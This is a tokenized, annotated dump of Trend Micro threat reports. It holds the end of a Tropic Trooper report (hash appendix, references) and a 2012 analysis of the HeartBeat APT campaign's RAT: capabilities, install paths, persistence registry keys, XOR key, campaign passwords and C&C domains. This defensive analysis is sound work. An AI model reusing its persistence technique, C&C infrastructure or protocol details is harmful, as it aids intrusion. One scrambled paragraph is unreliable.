collect
enough
information
to
determine
the
identities
and
motivations
of
the
actors
behind
Operation
Tropic B_malware.infosteal
Trooper I
,
we
were
able
to
gather
enough
intelligence
to
help
potential
victims
defend
against
the
campaign
.

Knowing
that
attackers
are
still
using
old
techniques
and
exploiting
known
vulnerabilities
will
make
it
easier
for
the
targeted
organizations
to
pinpoint
and
fix
security
gaps
in
their
networks
.

Building
threat
intelligence
is
crucial
in
the
fight
against
targeted
attacks
.

Identifying
the
tools
,
tactics
,
and
procedures
(
TTPs
)
that
threat
actors
use
based
on
external
reports
and
internal
historical
and
current
monitoring
can
help
create
a
strong
database
of
indicators
of
compromise
(
IoCs
)
that
can
serve
as
basis
for
action
.

Using
the
right
tools
for
advanced
threat
protection
should
also
be
part
of
an
expanded
security
monitoring
strategy
.

This
includes
establishing
and
empowering
incident
response
teams
and
training
employees
,
partners
,
and
vendors
on
social
engineering
and
computer
security
.

[
14
]

APPENDIX

Malicious
Files

Filename

SHA-1
Hash

Trend
Micro
Detection
Name

17ee08b92aeefb8d3d73a02beb03e634b453b5fe B_hash

25c2540125a4f6db5bd9e71b9130ba19aed4af2c B_hash

3a8bed630679a30c8f945a7f9fe9eef18dd18ef8 B_hash

3ff3519749764f64f5f208347f39bd77f7e2fa92 B_hash

43f565273e9b2bcfa9640c41ebb591f5dccca23e B_hash

47747dccd1fc57a6456cf2a06d654966193545e5 B_hash

542ca28d4154e4e4382f9dfe4e0c37983046e93d B_hash

56680180af5a792dca8e6112c57810b5e06bca1b B_hash

5c5a4ceea45c3f0e67085b9d323da13eedcf6e1b B_hash

6099001d54d39bcdd7c874672e8b28789e79721f B_hash

77eaac29dc3f46fdd4782b3a633a9c4b35fbdf20 B_hash

7d5fd316f12ff39e5a9b43dabd66eccdcdb164e7 B_hash

973e522edeb08bea948098ce7c8b83866857de9c B_hash

a31d398abf230f18bee6487732ad477e98a4f784 B_hash

a7713afd111b40da066449cc4450338316e51462 B_hash

aef101fb24bd39e3cc14c26796c0336f2cb1d540 B_hash

b1fdb46cbe73cc14f784bebac47e33606b259967 B_hash

ba71031ec0dccf09fbc48af61a22e5faa6b055a4 B_hash

bb8fddcd993a3ca94c6dd583f36df76bb5227ca5 B_hash

c4ae20ef0a90f095a88a9ea9920e97733a4d5626 B_hash

d50c657ff3068bd03ef74cfa5a289bbda87f33ef B_hash

dd011e35df5b529f4a92d480428c63faa8a6da3f B_hash

f8ac7ccf99485f485a435e05420bf3c103a3a549 B_hash

0360098a17c5c68004350f3eb34ab6c2b5b7b6f6 B_hash

2f853796b9598a85ce90c499f4e4e194b1348e0c B_hash

5adcea95439abf2c2c335af187dbeb92cb5587c0 B_hash

70b0dafe10f2399bb3ae767be376b6f5cd68db19 B_hash

84842226e9b626b2b4fca325fb1d13058aabf1be B_hash

a149a79149ab080004adee3051bf0fd874177e97 B_hash

0f7f277c57a7656e116894bb3460a15669bffaa3 B_hash

49f4db863e4ac5b2c55e1bc7540ee865f5126dba B_hash

52084036ed353e24423e0bd1f10ea741096e8fbd B_hash

7835e3ca339626f87738644092bdf91a8a15eaac B_hash

aa7e591951c085e0ab50748e6e0d96be99ad3f1a B_hash

ac1bfb13e8d79a2cbd33cf3e4ef94a6f0c32abfc B_hash

afe298099de7af1c43c97dce3e649f0c83164707 B_hash

e771cff898649a5a00b4421db186859b1b04cac9 B_hash

TROJ_YAHOYAH.A

BKDR_YAHAMAM.A

TROJ_YAHAMAM.A

credentials.exe

(Image).jpg

mfc41.dll/rpcrt32.dll

Filename

SHA-1
Hash

Trend
Micro
Detection
Name

(Exploit).doc

159a91f9c9a83493c03f83c22f478019b7f6e8ca B_hash

2665e536de618760cfe4b57c8f679d95fbb3da0b B_hash

2bd3f8356d4a3415e07311ffdc2d4834c0141029 B_hash

305dcb0e9257875d0699567d7d10e69e6014eed1 B_hash

312cc84043490b7a3b54fecff977cab75785f0c0 B_hash

3631faf525863d8bd24e571e04b41bdced047734 B_hash

4236be3aa2abc45e49a27d9bf87b6e5003d805c5 B_hash

7676bd47deaf69a8a3a17a3f9e261b7aca1dac24 B_hash

7b48460b5f6f8bc68fedb78a07f7884f57c66b57 B_hash

8136ce73e502882fa187f7b53b549376bfb52ba2 B_hash

a5ce827db51b204af7fef1a5b12b10a2566430bc B_hash

TROJ_MDROPPER.RDY

REFERENCES

[
1
]

Nex
.
(
7
June
2013
)
.

Rapid7
Community
.

'KeyBoy
,
Targeted
Attacks
Against
Vietnam
and
India
.
'

Last
accessed
on
7
April
2015
,
https://community.rapid7.com/community/infosec/blog/2013/06/07/keyboy-targeted-attacks-against-vietnam-and-india B_url.normal
.

Investopedia
,
LLC
.

(
2015
)
.

Investopedia
.

'Heavy
Industry
.
'

Last
accessed
on
22
April
2015
,
http://www.investopedia.com/terms/h/heavy_industry.asp B_url.normal
.

[
2
]

[
3
]

Loucif
Kharouni
.

(
10
January
2014
)
.

TrendLabs
Security
Intelligence
Blog
.

'Targeted
Attack
Methodologies
for
Cybercrime
.
'

Last
accessed
on
7
April
2015
,
http://blog.trendmicro.com/trendlabs-security-intelligence/whatever-works-targeted-attack-methodologies-for-cybercrime/ B_url.normal
.

[
4
]

Kyle
Wilhoit
.

(
15
December
2013
)
.

TrendLabs
Security
Intelligence
Blog
.

'Cybercriminals
Using
Targeted
Attack
Methodologies
(
Part
1
)
.
'

Last
accessed
on
7
April
2015
,
http://blog.trendmicro.com/trendlabs-security-intelligence/cybercriminals-using-targeted-attack-methodologies-part-1/ B_url.normal
.

[
5
]

Maersk
Menrige
.

(
17
June
2014
)
.

TrendLabs
Security
Intelligence
Blog
.

'Template
Document
Exploit
Found
in
Several
Targeted
Attacks
.
'

Last
accessed
on
7
April
2015
,
http://blog.trendmicro.com/trendlabs-security-intelligence/template-document-exploit-found-in-several-targeted-attacks/ B_url.normal
.

[
6
]

Ryan
Flores
.

(
9
May
2012
)
.

TrendLabs
Security
Intelligence
Blog
.

'Snapshot
of
Exploit
Documents
for
April
2012
.
'

Last
accessed
on
7
April
2015
,
http://blog.trendmicro.com/trendlabs-security-intelligence/snapshot-of-exploit-documents-for-april-2012/ B_url.normal
.

[
7
]

Trend
Micro
Incorporated
.

(
2014
)
.

Trend
Micro
Security
Intelligence
.

'Cashing
in
on
Digital
Information
:
An
Onslaught
of
Online
Banking
Malware
and
Ransomware
.
'

Last
accessed
on
7
April
2015
,
http://www.trendmicro.com/cloud-content/us/pdfs/security-intelligence/reports/rpt-cashing-in-on-digital-information.pdf B_url.normal
.

[
9
]

[
8
]

Wikimedia
Foundation
,
Inc
.

(
12
October
2014
)
.

Wikipedia
.

'Alipin
.
'

Last
accessed
on
8
April
2015
,
http://en.wikipedia.org/wiki/Alipin B_url.normal
.

Jennifer
Gumban
.

(
3
March
2014
)
.

TrendLabs
Security
Intelligence
Blog
.

'Sunsets
and
Cats
Can
Be
Hazardous
to
Your
Online
Bank
Account
.
'

Last
accessed
on
10
April
2015
,
http://blog.trendmicro.com/trendlabs-security-intelligence/sunsets-and-cats-can-be-hazardous-toyour-online-bank-account/ B_url.normal
.

[
10
]

Trend
Micro
Incorporated
.

(
2015
)
.

Threat
Encyclopedia
.

'HKTL_
GETOS
.
'

Last
accessed
on
10
April
2015
,
http://about-threats.trendmicro.com/ArchiveGrayware.aspx?language=cn&name=HKTL_GETOS B_url.normal
.

[
11
]

Jeff
King
and
Kevin
Lauerman
.

(
2015
)
.

Cisco
.

'ARP
Poisoning
(
Manin-the-Middle
)
Attack
and
Mitigation
Techniques
.
'

Last
accessed
on
20
April
2015
,
http://www.cisco.com/c/en/us/products/collateral/switches/catalyst-6500-series-switches/white_paper_c11_603839.html B_url.normal
.

[
12
]

SANS
Institute
.

(
2010
)
.

SANS
Institute
InfoSec
Reading
Room
.

'Pass-the-Hash
Attacks
:
Tools
and
Mitigation
.
'

Last
accessed
on
20
April
2015
,
http://www.sans.org/reading-room/whitepapers/testing/pass-the-hash-attacks-tools-mitigation-33283 B_url.normal
.

[
13
]

McAfee
,
Inc
.

(
2014‒2015
)
.

McAfee
for
Business
.

'Generic
Dropper
!
dyh
!
4929C723EA9D
.
'

Last
accessed
on
1
April
2015
,
http://www.mcafee.com/threat-intelligence/malware/default.aspx?id=570595 B_url.normal
.

[
14
]

Trend
Micro
Incorporated
.

(
2015
)
.

Trend
Micro
Security
News
.

'Targeted
Attack
Campaigns
and
Trends
:
2014
Annual
Report
.
'

Last
accessed
on
14
April
2015
,
http://www.trendmicro.com/vinfo/us/security/news/cyber-attacks/targeted-attack-campaigns-and-trends-2014-annual-report B_url.normal
.

Trend
Micro
Incorporated
,
a
global
leader
in
security
software
,
strives
to
make
the
world
safe
for
exchanging
digital
information
.

Our
innovative
solutions
for
consumers
,
businesses
and
governments
provide
layered
content
security
to
protect
information
on
mobile
devices
,
endpoints
,
gateways
,
servers
and
the
cloud
.

All
of
our
solutions
are
powered
by
cloud-based
global
threat
intelligence
,
the
Trend
MicroTM
Smart
Protection
NetworkTM
,
and
are
supported
by
over
1,200
threat
experts
around
the
globe
.

For
more
information
,
visit
www.trendmicro.com B_url.normal
.

©
2015
by
Trend
Micro
,
Incorporated
.

All
rights
reserved
.

Trend
Micro
and
the
Trend
Micro
t-ball
logo
are
trademarks
or
registered
trademarks
of
Trend
Micro
,
Incorporated
.

All
other
product
or
company
names
may
be
trademarks
or
registered
trademarks
of
their
owners
.

225
E
.

John
Carpenter
Freeway

Suite
1500

Irving
,
Texas

75062
U.S.A.

Phone
:
+1.817.569.8900

Created
by
:

The
Global
Technical
Support
&
R
&
D
Center
of
TREND
MICRO
Trend
Micro
Incorporated

Research
Paper

2012

The
HeartBeat B_malware.drop
APT

Campaign

Roland
Dela
Paz

Contents

About
This
Paper
..................................................................................................................................
1

Introduction
...........................................................................................................................................
1

Campaign
Targets
................................................................................................................................
2

Context
...................................................................................................................................................
2

Attack
Vector
........................................................................................................................................
3

Infection
Flow
.......................................................................................................................................4

The
RAT B_malware.backdoor
Component
...........................................................................................................................5

Backdoor
Functionalities
............................................................................................................5

Installation
and
Persistence
.......................................................................................................5

C
&
C
Communication
....................................................................................................................6

Command
and
Control
........................................................................................................................8

HeartBeat B_malware.drop
Campaign
Codes
and
Decoy
Documents
...................................................................8

Relationships
among
C
&
C
Domains
,
IPs
,
and
Campaigns
..........................................................9

Attribution
............................................................................................................................................10

Conclusion
............................................................................................................................................10

Timeline
.................................................................................................................................................10

Defending
against
the
HeartBeat B_malware.drop
Campaign
................................................................................11

Trend
Micro
Threat
Protection
Against
The
HeartBeat B_malware.drop
Campaign
Components
................12

PAGE
ii
|
THE
HeartBeat B_malware.drop
APT
CAMPAiGN

About
this
PAPer

introduCtion

This
paper
exposes
a
targeted
attack
called
'HeartBeat B_malware.drop
,
'
which
has
been
persistently
pursuing
the
South
Korean
government
and
related
organizations
since
2009
.

This
paper
will
discuss
how
their
specifically
crafted
campaigns
infiltrate
their
targets
.

Today
's
cybercriminals
try
to
infect
as
many
users
as
possible
.

Their
goal
is
simple—to
monetize
the
resources
or
data
from
infected
machines
in
any
way
they
can
.

Behind
such
attacks
are
highly
covert
targeted
campaigns
known
as
APTs
.

Compared
to
most
advanced
persistent
threat
(
APT
)
campaigns
with
diverse
targeted
industries
,
the
HeartBeat B_malware.drop
campaign
is
an
isolated
case
.

Furthermore
,
we
will
examine
their
attack
methodologies
which
include
their
attack
vector
,
the
remote
administration
tool
(
RAT B_malware.backdoor
)
component
,
and
command-and-control
servers
.

Finally
,
we
will
discuss
how
this
information
can
be
useful
in
developing
defensive
strategies
in
protecting
organizations
as
well
as
predicting
future
targets
.

While
targeted
campaigns
continue
to
increase
,
research
efforts
by
the
security
industry
reveal
that
some
of
these
attacks
have
existed
for
several
years.1
Depending
on
the
motive
,
APT
campaigns
may
attack
various
industries
,
organizations
or
communities
from
different
regions
and
countries
.

For
instance
,
the
Luckycat
campaign
targeted
the
aerospace
,
energy
,
engineering
,
shipping
,
and
military
research
industries
in
India
and
Japan.2
Additionally
,
they
targeted
the
Tibetan
activists
'
community
.

The
IXESHE
campaign
,
on
the
other
hand
,
targeted
East
Asian
governments
,
Taiwanese
electronics
manufacturers
,
and
a
telecommunications
company.3
While
most
of
these
campaigns
have
multiple
targets
,
smaller
,
more
subtle
campaigns
with
exceedingly
specific
targets
are
also
present
.

The
Taidoor B_malware.drop
campaign
is
an
example
of
this
,
where
all
of
the
compromise
victims
were
from
Taiwan
,
and
the
majority
of
which
were
government
organizations.4
This
research
paper
will
delve
into
a
targeted
campaign
that
targets
organizations
and
communities
within
South
Korea
.

We
call
this
malicious
operation
the
'HeartBeat B_malware.drop
campaign
.
'

1
http://www.trendmicro.com/cloud-content/us/pdfs/security-intelligence/white-papers/wp_dissecting-lurid-apt.pdf B_url.normal

2
http://www.trendmicro.com/cloud-content/us/pdfs/security-intelligence/white-papers/wp_luckycat_redux.pdf B_url.normal

3
http://www.trendmicro.com/cloud-content/us/pdfs/security-intelligence/white-papers/wp_ixeshe.pdf B_url.normal

4
http://www.trendmicro.com/cloud-content/us/pdfs/security-intelligence/white-papers/wp_the_taidoor_campaign.pdf B_url.normal

PAGE
1
|
THE
HeartBeat B_malware.drop
APT
CAMPAiGN

CAmPAign
tArgets

Context

The
HeartBeat B_malware.drop
campaign
appears
to
target
government
organizations
and
institutions
or
communities
that
are
in
some
way
related
to
the
South
Korean
government
.

Specifically
,
we
were
able
to
identify
the
following
targets
:

•
Political
parties

•
Media
outfits

•
A
national
policy
research
institute

•
A
military
branch
of
South
Korean
armed
forces

The
first
HeartBeat B_malware.drop
campaign
remote
access
tool
(
RAT B_malware.backdoor
)
5
component
was
discovered
in
June
2012
in
a
Korean
newspaper
company
network
.

Further
investigation
revealed
that
the
campaign
has
been
actively
distributing
their
RAT B_malware.backdoor
component
to
their
targets
in
2011
and
the
first
half
of
2012
.

Furthermore
,
we
uncovered
one
malware
component
that
dates
back
to
November
2009
.

This
indicates
that
the
campaign
started
during
that
time
or
earlier
.

Earlier
versions
of
the
HeartBeat B_malware.drop
campaign
's
RAT B_malware.backdoor
component
contained
the
following
strings
in
their
codes
:

•
A
small
business
sector
organization
Thus
,
the
campaign
name
'HeartBeat B_malware.drop
.
'

•
Branches
of
South
Korean
government
The
profile
of
their
targets
suggests
that
the
motive
behind
the
campaign
may
be
politically
motivated
.

Figure
1
.

Code
used
in
the
HeartBeat B_malware.drop
campaign
's
RAT B_malware.backdoor
component

PAGE
2
|
THE
HeartBeat B_malware.drop
APT
CAMPAiGN

5
http://en.wikipedia.org/wiki/Remote_administration_software B_url.normal

AttACk
VeCtor

In
order
to
gain
control
over
targets
systems
,
HeartBeat B_malware.drop
perpetrators
install
a
RAT B_malware.backdoor
in
prospective
victims
'
systems
.

This
RAT B_malware.backdoor
arrives
as
a
disguised
or
fake
document
which
is
actually
a
bundled
file
.

The
bundled
file
contains
both
a
decoy
document
and
the
RAT B_malware.backdoor
installer
that
has
been
packaged
together
using
a
binder
tool
.

Once
it
runs
,
the
decoy
document
is
displayed
to
the
user
while
the
RAT B_malware.backdoor
unknowingly
executes
in
the
background
.

It
is
unclear
how
these
packaged
files
specifically
arrive
on
victims
'
systems
,
but
we
highly
suspect
that
spearphishing
emails6
containing
these
packaged
malware
were
primarily
used
to
distribute
them
.

In
fact
,
the
packaged
malware
used
the
icon
of
the
decoy
document
in
order
to
look
legitimate
.

For
instance
,
if
the
decoy
is
an
XLS
file
,
the
package
will
appear
to
have
an
XLS
document
icon
.

In
addition
,
some
of
the
decoy
files
required
passwords
in
order
to
be
viewed
.

Based
on
the
samples
we
collected
,
the
campaign
's
decoy
documents
used
the
file
formats
.JPG
,
.PDF
,
XLS
,
and
HWP
,
the
Korean
government
standard
word
processor
format
.

One
of
the
previous
HeartBeat B_malware.drop
attacks
even
dropped
a
pornographic
.JPG
image
as
decoy
.

Below
is
a
screenshot
of
a
Hangul
Word
Processor
(
.HWP
)
document
used
as
bait
in
November
2011
.

Its
document
title
roughly
translates
to
'Information
to
the
President.hwp
.
'

Figure
3
.

A
decoy
.HWP
document

Figure
2
.

Example
of
a
decoy
Adobe
Reader
document

The
previously
mentioned
techniques
are
commonly
used
in
spearphishing
attacks
where
prospective
victims
are
lured
to
open
a
seemingly
benign
document
attachment
.

In
order
to
appear
more
legitimate
,
some
of
these
emails
contain
password
protected
documents
.

A
password
is
then
provided
in
the
email
body
as
a
social
engineering
technique
.

6
http://blog.trendmicro.com/taiwan-spear-phishers-target-gmail-users/ B_url.normal

PAGE
3
|
THE
HeartBeat B_malware.drop
APT
CAMPAiGN

infeCtion
flow

Once
users
open
the
packaged
malicious
file
,
the
actual
document
is
displayed
to
the
user
while
a
RAT B_malware.backdoor
installer
in
.EXE
format
runs
in
the
background
.

The
RAT B_malware.backdoor
installer
,
on
the
other
hand
,
drops
a
.DLL
file
that
is
then
injected
to
the
legitimate
process
svchost.exe
.

The
injected
code
in
svchost.exe
then
connects
to
the
malware
command
and
control
(
C
&
C
)
server
to
register
infection
and
wait
for
remote
commands
.

Figure
4
.

Infection
diagram
for
the
HeartBeat B_malware.drop
campaign

TREND
MICRO
INCORPORATED

Trend
Micro
Incorporated
(
TYO
:
4704
;
TSE
:
4704
)
,
a
global
cloud
security
leader
,
creates
a
world
safe
for
exchanging
digital
information
with
its
Internet
content
security
and
threat
management
solutions
for
businesses
and
consumers
.

A
pioneer
in
server
security
with
over
20
years
'
experience
,
we
deliver
top-ranked
client
,
server
and
cloud-based
security
that
fits
our
customers
'
and
partners
'
needs
,
stops
new
threats
faster
,
and
protects
data
in
physical
,
virtualized
and
cloud
environments
.

Powered
by
the
industry-leading
Trend
MicroTM
Smart
Protection
NetworkTM
cloud
computing
security
infrastructure
,
our
products
and
services
stop
threats
where
they
emerge—from
the
Internet
.

They
are
supported
by
1,000+
threat
intelligence
experts
around
the
globe
.

TREND
MICRO
INC
.

10101
N
.

De
Anza
Blvd
.

Cupertino
,
CA
95014
U.S.
toll
free
:
1
+800.228.5651

Phone
:
1
+408.257.1500

Fax
:
1
+408.257.2003

www.trendmicro.com B_url.normal

©2012
by
Trend
Micro
,
Incorporated
.

All
rights
reserved
.

Trend
Micro
and
the
Trend
Micro
t-ball
logo
are
trademarks
or
registered
trademarks
of
Trend
Micro
,
Incorporated
.

All
other
product
or
company
names
may
be
trademarks
or
registered
trademarks
of
their
owners
.

PAGE
4
|
THE
HeartBeat B_malware.drop
APT
CAMPAiGN

the
RAT B_malware.backdoor
ComPonent

Backdoor
Functionalities

The
HeartBeat B_malware.drop
campaign
's
RAT B_malware.backdoor
component
allows
attackers
to
remotely
execute
the
following
commands
on
affected
hosts
:

The
RAT B_malware.backdoor
installer
in
turn
drops
a
.DLL
component
which
contains
the
backdoor
capabilities
.

In
order
to
stay
hidden
,
the
.DLL
uses
file
names
similar
to
legitimate
applications
.

Below
is
a
list
of
file
names
used
:

•
%
Program
Files
%
\Common
Files\Services\6to4nt.dll

•
%
Program
Files
%
\Common
Files\System\6to4nt.dll

•
%
Program
Files
%
\Windows
NT\Accessories\6to4nt.dll

•
List
running
processes
and
their
respective
process

•
%
Program
Files
%
\Windows
NT\htrn.dll
IDs

•
Download
and
execute
file
(
s
)

•
Update
itself

•
Uninstall
itself

•
Create
or
terminate
a
process

•
List
available
removable
and
fixed
drives

•
List
existing
files
and
their
creation
date/time

•
Upload
file
(
s
)

•
Delete
file
(
s
)
•
Get
the
file
creation
date/time
of
a
specific
file

•
Open
a
remote
command
shell
access

•
Reboot
the
system

These
commands
give
the
attackers
complete
control
over
their
victims
'
systems
.

Attackers
also
have
the
option
to
uninstall
the
RAT B_malware.backdoor
any
time
to
cover
their
tracks
and
avoid
being
discovered
.

Installation
and
Persistence

The
RAT B_malware.backdoor
installer
is
initially
dropped
and
executed
by
the
packaged
file
using
any
of
the
following
file
names
:

•
%
System%\msrt.exe

•
%
Program
Files
%
\Common
Files\AcroRd32.exe

•
%
Program
Files
%
\Common
Files\config.exe

•
%
Program
Files
%
\Common
Files\explorer.exe

•
%
Program
Files
%
\Windows
NT\htrn_jls.dll

•
%
Program
Files
%
\Windows
NT\hyper.dll

•
%
System
%
\Network
Remote.dll

•
%
System%\SvcHost.dll

Some
these
dropped
.DLL
files
use
fake
file
properties
in
order
to
not
appear
suspicious
.

The
following
is
an
example
:

Figure
5
.

A.DLL
that
uses
fake
file
properties

PAGE
5
|
THE
HeartBeat B_malware.drop
APT
CAMPAiGN

In
some
cases
,
the
RAT B_malware.backdoor
installer
drops
2
.DLL
files
where
one
of
the
.DLLs
serves
as
a
loader
of
the
other
.DLL
file
which
contains
the
backdoor
payload
.

The
.DLL
component
is
then
registered
as
a
service
through
the
following
added
registries
:

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\
Services\
{
service
name
}
Type
=
'20
'
Start
=
'2
'
ErrorControl
=
'1
'
ImagePath
=
'
%
SystemRoot%\System32\svchost.exe
-k
netsvcs
'
ObjectName
=
'LocalSystem
'
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\
Services\
{
service
name
}
\Parameters
ServiceDll
=
C
:
\Program
Files\Windows
NT\htrn.dll
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\
Services\
{
service
name
}
\Security
Security
=
{
values
}
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\
Services\
{
service
name
}
\Enum
0
=
'Root\LEGACY_
{
service
name
}
\0000
'
Count
=
'1
'
NextInstance
=
'1
'
*
{
service
name
}
may
be
'6to4
'
,
'Ias
'
or
'Irmon
'
.

The
service
is
then
invoked
once
installed
.

This
results
in
the
.DLL
being
injected
to
svchost.exe
process
.

This
registry
modification
allows
the
RAT B_malware.backdoor
to
execute
upon
every
system
startup
.

After
installation
the
RAT B_malware.backdoor
installer
deletes
itself
,
which
leaves
only
the
disguised
.DLL
and
related
registry
entries
on
the
affected
system
.

Note
that
the
presence
of
any
of
the
files
or
registries
above
may
be
an
indication
of
a
possible
HeartBeat B_malware.drop
infection
in
a
system
.

PAGE
6
|
THE
HeartBeat B_malware.drop
APT
CAMPAiGN

C
&
C
Communication

Once
the
RAT B_malware.backdoor
's
.DLL
component
has
been
injected
to
svchost.exe
,
the
malware
attempts
to
register
itself
to
the
C
&
C
server
by
sending
the
following
information
from
the
affected
system
:

•
Computer
name

•
Local
IP
address

•
Service
pack

These
data
are
sent
along
with
a
campaign
code
and
the
string
'qawsed
'
.

While
the
'qawsed
'
string
is
not
present
in
earlier
versions
of
their
RAT B_malware.backdoor
,
we
suspect
that
the
attackers
only
recently
added
this
as
a
default
campaign
password
.

The
RAT B_malware.backdoor
's
C
&
C
communication
is
encrypted
with
XOR
encryption
using
a
single
byte
key
,
02H
.

Furthermore
,
the
data
being
transferred
and
received
by
the
RAT B_malware.backdoor
C
&
C
are
800H
(
2,048
bytes
)
in
size
.

Figure
6
.

RAT B_malware.backdoor
's
encryption
algorithm
before
sending
data
to
its
C
&
C
server

Figure
7
.

RAT B_malware.backdoor
's
decryption
code
upon
receiving
data
from
the
C
&
C
server

During
the
RAT B_malware.backdoor
's
phone
home
,
the
following
TCP
traffic
is
observed
on
the
network
:

When
decrypted
,
the
above
traffic
looks
as
follows
:

The
majority
of
the
RAT B_malware.backdoor
variants
used
port
80
.

Recent
variants
,
however
,
were
observed
to
use
port
443
.

Other
ports
we
have
seen
being
utilized
are
port
5600
and
port
8080
.

Earlier
RAT B_malware.backdoor
variants
did
not
use
encryption
on
their
C
&
C
communication
.

Moreover
,
they
only
sent
the
computer
name
and
campaign
code
during
phone
home
.

Below
is
a
screenshot
of
the
unencrypted
C
&
C
communication
.

PAGE
7
|
THE
HeartBeat B_malware.drop
APT
CAMPAiGN

The
C
&
C
traffic
size
also
varied
in
previous
versions
.

Some
early
variants
used
traffic
that
are
28H
(
40
bytes
)
and
1004H
(
4,100
bytes
)
in
size
.

HeartBeat B_malware.drop
CAmPAign
Codes
And
deCoy
doCuments

Additionally
,
the
port
,
C
&
C
address
,
campaign
code
and
password
are
hardcoded
in
the
RAT B_malware.backdoor
's
malware
body
in
plain
text
.

In
some
RAT B_malware.backdoor
versions
,
however
,
they
are
encrypted
and
are
decrypted
only
during
run-time
,
possibly
to
protect
the
RAT B_malware.backdoor
from
static
analysis
by
security
researchers
.

These
variations
in
their
RAT B_malware.backdoor
component
indicate
that
it
has
since
been
undergoing
development
.

CommAnd
And
Control

The
HeartBeat B_malware.drop
campaign
's
C
&
C
domains
appear
to
utilize
a
site
redirection
service
.

Their
C
&
C
sites
redirect
to
IP
addresses
from
ISPs
in
Armenia
,
USA
,
Japan
,
India
and
Korea
.

We
observed
that
they
updated
the
IP
address
of
some
of
their
C
&
C
domains
.

Likewise
,
all
of
their
IP
addresses
belong
to
legitimate
ISPs
.

Considering
this
,
we
suspect
that
these
IP
addresses
are
compromised
hosts
that
act
as
proxy
servers
which
redirects
traffic
to
the
actual
C
&
C
servers
.

Again
,
this
adds
another
layer
of
anonymity
to
the
HeartBeat B_malware.drop
perpetrators
.

Domain

IP
Address

ahnlab.myfw.us B_url.cncsvr

kissyou01.myfw.us B_url.cncsvr

kita.myfw.us B_url.cncsvr

login.sbs.com.PassAs.us B_url.cncsvr

mail2.myfw.us B_url.cncsvr

park007.myfw.us B_url.cncsvr

snrp.UglyAs.com B_url.cncsvr

www.banking.com.PassAs.us B_url.cncsvr

www.huyang.go.kr.PassAs.us B_url.cncsvr

www.kinu.or.kr.rr.nu B_url.cncsvr

XXX.XXX.217.123 B_ip.cncsvr
/XXX.XX.121.84 B_ip.cncsvr

XX.XXX.203.122 B_ip.cncsvr
/
XX.XXX.20.103 B_ip.cncsvr

XXX.XXX.217.123 B_ip.cncsvr
/
XXX.XX.121.84 B_ip.cncsvr

XXX.XXX.178.50 B_ip.cncsvr

XX.XXX.15.63 B_ip.cncsvr
/
XXX.XXX.198.93 B_ip.cncsvr

unknown

XXX.XXX.169.45 B_ip.cncsvr

XXX.XXX.178.50 B_ip.cncsvr

XXX.XXX.217.123 B_ip.cncsvr
/
XX.XXX.136.115 B_ip.cncsvr

XXX.XXX.178.50 B_ip.cncsvr

www.kndu.ac.kr.myfw.us B_url.cncsvr

young03.myfw.us B_url.cncsvr

XXX.XXX.4.180 B_ip.cncsvr

XX.XXX.203.122 B_ip.cncsvr

Table
1
.

List
of
HeartBeat B_malware.drop
C
&
Cs

PAGE
8
|
THE
HeartBeat B_malware.drop
APT
CAMPAiGN

The
campaign
codes
and
decoy
documents
used
by
the
HeartBeat B_malware.drop
attackers
provided
valuable
insights
on
their
campaigns
.

In
fact
,
majority
of
their
campaign
codes
included
number
combinations
which
represented
the
month
and
date
in
MMDD
format
when
the
attack
attempt
was
executed
.

The
rest
of
the
campaign
code
string
often
describes
the
decoy
document
that
was
used
in
a
specific
campaign
.

For
instance
,
a
campaign
code
from
October
2011
is
'army-1022
'
where
attackers
used
a
decoy
document
containing
military-related
information
.

Campaign
code

Password

1119HWP

kris0315

PDF-0417

gh-0525

0909-jpg

0916

jpg-jf-0925

army-1022

1103-ghui

1113-minzhu

ajh7884
@
han

001

0305-ziyoudang

0326-xuehui

0328-junf

0329-mnd

1q2w3e4r

0520-tiegang

guohui-0604

None

None

None

None

qawsed

qawsed

qawsed

qawsed

qawsed

qawsed

qawsed

qawsed

qawsed

qawsed

qawsed

qawsed

None

qawsed

qawsed

Table
2
.

Campaign
codes
used
On
the
other
hand
,
decoy
documents
'
contents
were
also
very
specific
to
their
targets
.

For
example
,
some
of
these
documents
included
logos
of
specific
groups
.

This
information
helped
us
identify
their
targeted
organizations
and
communities
in
their
previous
campaigns
.

stnenopmockcattataeBtraeHneewtebsphsnoitaeR7
.

erugFiliiNGAPMACTPATAEBTRAEHEHT
|
9EGAPisngAPmACdnA
,
sPii
,
snAmodC
&
CgnomAsPhsnotAlerii

Attribution

Clues
relating
to
the
attackers
remain
very
limited
.

Using
compromised
hosts
as
C
&
C
proxy
servers
minimizes
the
possibility
of
tracking
potential
threat
actors
.

While
a
number
of
their
campaign
codes
included
Chinese
words
such
as
guohui
,
xuehui
and
minzhu
,
they
appear
to
be
comfortable
using
the
English
language
.

Some
of
the
C
&
C
domain
names
even
contained
English
words
.

In
addition
,
the
binder
tool
and
the
RAT B_malware.backdoor
component
are
written
in
English
.

For
instance
,
some
text
from
the
packaged
components
'
body
included
'Select
Files
!
'

and
'Bind
Success
!

'
,
while
the
RAT B_malware.backdoor
component
included
strings
such
as
'Uninstall...ok
'
and
the
name
of
the
RAT B_malware.backdoor
itself
,
'HeartBeat B_malware.drop
.
'

Threat
actors
and
entities
that
use
collected
information
from
targets
may
be
two
separate
parties
that
are
only
related
in
a
professional
and
malicious
manner
.

In
this
case
,
determining
the
latter
may
be
impossible
.

Likewise
,
it
is
very
difficult
to
identify
the
threat
actors
behind
the
HeartBeat B_malware.drop
campaign
given
the
limited
amount
of
information
available
.

ConClusion

The
HeartBeat B_malware.drop
campaign
has
been
successfully
executing
targeted
attacks
since
2009
.

In
order
for
attackers
to
properly
track
their
campaigns
and
victims
,
they
used
campaign
codes
that
contained
the
campaign
dates
and
strings
that
described
specific
campaigns
.

These
campaign
codes
are
embedded
in
their
RAT B_malware.backdoor
binaries
and
were
sent
to
their
C
&
C
servers
along
with
information
regarding
the
targets
'
system
.

Additionally
,
they
used
a
commercial
site
redirection
service
for
their
C
&
C
domains
.

These
domains
redirected
to
various
IP
addresses
that
belonged
to
legitimate
ISPs
,
which
may
be
compromised
hosts
that
act
as
proxy
servers
.

This
effectively
hides
the
real
location
of
the
attackers
behind
HeartBeat B_malware.drop
.

While
having
an
isolated
target
may
have
helped
them
stay
under
the
security
industry
's
radar
,
the
attackers
illustrated
that
they
were
very
careful
but
persistent
.

Understanding
targeted
campaigns
and
their
methodologies
is
fundamental
in
protecting
both
end
